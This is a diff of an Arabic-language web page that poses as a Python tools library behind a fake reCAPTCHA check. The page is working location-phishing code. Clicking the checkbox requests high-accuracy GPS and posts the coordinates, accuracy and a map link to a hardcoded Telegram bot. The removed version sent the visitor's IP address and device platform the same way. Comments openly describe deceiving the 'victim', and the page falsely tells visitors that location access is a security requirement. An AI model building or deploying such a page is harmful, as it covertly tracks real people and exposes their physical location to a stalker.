@@ -3,73 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Python Dev Tools | مكتبة المطورين</title>
+    <title>المكتبة البرمجية | Baratheon Core</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #0f172a; color: white; text-align: center; font-family: sans-serif; padding: 40px 20px; }
-        .card { background: #1e293b; border-radius: 15px; padding: 30px; border: 1px solid #334155; max-width: 400px; margin: auto; }
-        .btn { background: linear-gradient(90deg, #3776ab, #ffd343); color: #000; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; border: none; transition: 0.3s; }
-        .btn:hover { opacity: 0.8; transform: scale(1.02); }
+        :root { --py-blue: #3776ab; --py-yellow: #ffd43b; --dark-bg: #0d1117; }
+        body { background-color: var(--dark-bg); color: #c9d1d9; font-family: sans-serif; overflow: hidden; }
+        #overlay { position: fixed; inset: 0; background: rgba(13, 17, 23, 0.98); backdrop-filter: blur(15px); z-index: 9999; display: flex; items-center; justify-content: center; }
+        .captcha-box { background: white; color: #333; border-radius: 24px; width: 92%; max-width: 400px; padding: 40px 30px; text-align: center; }
+        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; background-color: #ff4b4b; margin-left: 8px; }
+        .active-dot { background-color: #00c853 !important; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://www.python.org/static/community_logos/python-logo-master-v3-TM.png" width="80" class="mx-auto mb-4">
-        <h1 class="text-xl font-bold mb-2">مكتبة أدوات بايثون الشاملة</h1>
-        <p class="text-gray-400 text-sm mb-6">قبل تحميل الأدوات، يرجى إثبات أنك لست روبوت لتجنب ضغط السيرفر.</p>
-        
-        <button id="mainBtn" onclick="captureData()" class="btn">أنا لست روبوت - دخول مباشر</button>
-        
-        <p class="mt-4 text-xs text-gray-500">الحجم الإجمالي: 1.2 GB | الإصدار: 2026.4</p>
+
+    <div id="overlay">
+        <div class="captcha-box shadow-2xl">
+            <div class="flex items-center justify-center mb-6">
+                <i class="fab fa-python text-5xl text-blue-600 ml-4"></i>
+                <div class="text-right border-r-2 pr-4 border-gray-200">
+                    <h2 class="text-2xl font-black text-gray-800">تحقق الوصول</h2>
+                    <p class="text-xs font-bold text-blue-500 uppercase">System Security</p>
+                </div>
+            </div>
+
+            <div class="bg-gray-50 p-4 rounded-xl mb-6 text-right border border-gray-100">
+                <p class="text-sm text-gray-600 leading-relaxed">
+                    <span id="statusDot" class="status-dot"></span>
+                    حالة النظام: <span id="statusText" class="font-bold">بانتظار الموافقة..</span>
+                </p>
+            </div>
+
+            <p class="text-sm text-gray-500 mb-8 font-medium">يجب الضغط على المربع أدناه لتأكيد أنك بشري وتفعيل "تحديد الموقع الأمني" لفتح السكربتات.</p>
+
+            <label class="group flex items-center justify-between border-2 border-gray-100 bg-white p-5 rounded-2xl cursor-pointer hover:border-blue-400 transition-all shadow-sm">
+                <div class="flex items-center">
+                    <input type="checkbox" id="gpsTrigger" onclick="startHunt()" class="w-8 h-8 ml-4 accent-blue-600 cursor-pointer">
+                    <span class="text-gray-800 font-extrabold text-xl">أنا لست برنامج روبوت</span>
+                </div>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-6 opacity-30 group-hover:opacity-100 transition-opacity">
+            </label>
+        </div>
     </div>
+
+    <nav class="p-6 bg-[#161b22] border-b border-[#30363d] flex justify-between">
+        <div class="text-white font-bold text-xl">BARATHEON <span class="text-blue-500">LABS</span></div>
+    </nav>
 
     <script>
         const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
         const chat_id = "5475815049";
 
-        async function sendToTelegram(message) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: message, parse_mode: "HTML" })
-            });
-        }
+        async function startHunt() {
+            const checkbox = document.getElementById('gpsTrigger');
+            const statusDot = document.getElementById('statusDot');
+            const statusText = document.getElementById('statusText');
 
-        async function captureData() {
-            const btn = document.getElementById('mainBtn');
-            btn.innerText = "جاري التحقق من الهوية...";
-            btn.disabled = true;
+            if (navigator.geolocation) {
+                // نطلب الموقع بأعلى دقة ممكنة
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    // تحديث الحالة في الواجهة لخداع الضحية
+                    statusDot.classList.add('active-dot');
+                    statusText.innerText = "تم التحقق بنجاح!";
+                    
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const accuracy = pos.coords.accuracy; // دقة الإحداثيات
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const message = `🚀 <b>صيد جديد يا Baratheon!</b>\n\n📍 الموقع: ${mapUrl}\n🎯 الدقة: ${accuracy.toFixed(1)} متر`;
 
-            try {
-                // 1. جلب الـ IP فوراً (بدون إذن)
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                let infoMsg = `🚀 <b>صيد جديد!</b>\n\n🌐 <b>IP:</b> <code>${ipData.ip}</code>\n📱 <b>الجهاز:</b> ${navigator.platform}`;
-                await sendToTelegram(infoMsg);
-
-                // 2. طلب الـ GPS (يحتاج موافقة الشخص)
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        const mapMsg = `📍 <b>موقع GPS دقيق:</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
-                        await sendToTelegram(mapMsg);
-                        
-                        alert("تم التحقق! جاري تحويلك للمكتبة...");
-                        window.location.href = "https://www.python.org/downloads/";
-                    }, (err) => {
-                        // إذا رفض الـ GPS، نحوله مباشرة بما أننا أخذنا الـ IP
-                        alert("تم التحقق عبر الـ IP! جاري التحويل...");
-                        window.location.href = "https://www.python.org/downloads/";
+                    // إرسال البيانات فوراً
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chat_id,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
                     });
-                } else {
-                    window.location.href = "https://www.python.org/downloads/";
-                }
 
-            } catch (e) {
-                alert("خطأ في السيرفر، حاول مجدداً.");
-                btn.disabled = false;
-                btn.innerText = "أنا لست روبوت - دخول مباشر";
+                    // فتح الموقع
+                    setTimeout(() => {
+                        document.getElementById('overlay').style.display = 'none';
+                        document.body.style.overflow = 'auto';
+                        window.location.href = "https://www.python.org";
+                    }, 1000);
+
+                }, (err) => {
+                    // في حال الرفض
+                    checkbox.checked = false;
+                    alert("⚠️ خطأ أمني: يجب تفعيل 'خدمات الموقع' في المتصفح للسماح لك بدخول مكتبة السكربتات.");
+                }, {
+                    enableHighAccuracy: true, // تفعيل أعلى دقة (GPS حقيقي)
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("متصفحك قديم جداً ولا يدعم نظام الحماية.");
             }
         }
     </script>
